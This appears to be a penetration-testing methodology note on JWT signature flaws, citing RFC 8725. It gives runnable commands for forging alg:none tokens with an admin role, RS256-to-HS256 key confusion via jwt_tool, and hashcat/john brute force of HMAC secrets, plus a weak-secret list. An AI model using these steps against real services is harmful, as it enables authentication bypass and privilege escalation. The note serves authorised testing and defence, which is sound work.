# JWT signature and algorithm policy

Read for unsigned-token acceptance, asymmetric/HMAC key confusion, or weak HMAC keys. Confirm the configured algorithm policy first. Status and limits: see the named record in the [verification registry](../../hack/verification.json). Records: `jwt-algorithm-policy`, `jwt-key-confusion`.

## 2. ATTACK 1 — ALGORITHM NONE (alg:none)

A candidate arises when an application that requires signed tokens accepts an unsecured token. The registered `none` identifier is case-sensitive; alternative casing and a missing final separator are malformed negative controls, not equivalent valid encodings. An explicitly permitted unsecured profile needs separate policy analysis. [RFC 8725 sections 2.1 and 3.1–3.2](https://www.rfc-editor.org/rfc/rfc8725.html).

```bash
# Burp JWT Editor / python-jwt attack:
# Step 1: Decode header
# Inspect the original header; decoding does not validate it.

# Step 2: Create new header
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'

# Step 3: Modify payload (e.g., role → admin):
echo -n '{"userId":1234,"role":"admin"}' | base64 | tr -d '=' | tr '/+' '_-'

# Step 4: Construct token with empty signature:
HEADER.PAYLOAD.
# Malformed negative control (not a compact JWS with an empty signature):
HEADER.PAYLOAD
```

**Tool (jwt_tool)**:
```bash
python3 jwt_tool.py JWT_TOKEN -X a
# → automatically generates alg:none variants
```


## 3. ATTACK 2 — RS256 TO HS256 KEY CONFUSION

**Prerequisites:** the same verification path must wrongly allow an HMAC algorithm with the RSA public-key bytes as its HMAC secret. RS256 use or public-key visibility alone does not establish this bug. A TLS certificate key may differ from the token-signing key; identify the actual verifier key and encoding. [RFC 8725 sections 2.1 and 3.1](https://www.rfc-editor.org/rfc/rfc8725.html).
- Server's public key is often discoverable (JWKS endpoint, `/certs`, source code)
- Attack: tell server "this is HS256" → server verifies HS256 HMAC using **the public key as secret**

```bash
# Step 1: Obtain public key (PEM format)
# From: /api/.well-known/jwks.json → convert to PEM
# From: /certs endpoint
# From: OpenSSL extraction from HTTPS cert

# Step 2: Use jwt_tool to sign with HS256 using public key as secret:
python3 jwt_tool.py JWT_TOKEN -X k -pk public_key.pem

# Step 3: Manually:
# Modify header: {"alg":"HS256","typ":"JWT"}
# Sign entire header.payload with HMAC-SHA256 using PEM public key bytes
```


## 4. ATTACK 3 — JWT SECRET BRUTE FORCE

For an in-scope captured HMAC token with a plausibly weak key, use a bounded offline dictionary. No remote authentication loop is needed. A matching signature must be independently checked against the token; key recovery and permission impact are separate claims. Commands below are tool/version-specific examples, not runtime-validated here.

```bash
# hashcat (fast):
hashcat -a 0 -m 16500 "JWT_TOKEN_HERE" /usr/share/wordlists/rockyou.txt

# john:
echo "JWT_TOKEN_HERE" > jwt.txt
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt

# jwt_tool:
python3 jwt_tool.py JWT_TOKEN -C -d /path/to/wordlist.txt
```

**Common weak secrets to test manually**:
```
secret, password, 123456, qwerty, changeme, your-256-bit-secret,
APP_NAME, app_name, production, jwt_secret, SECRET_KEY
```
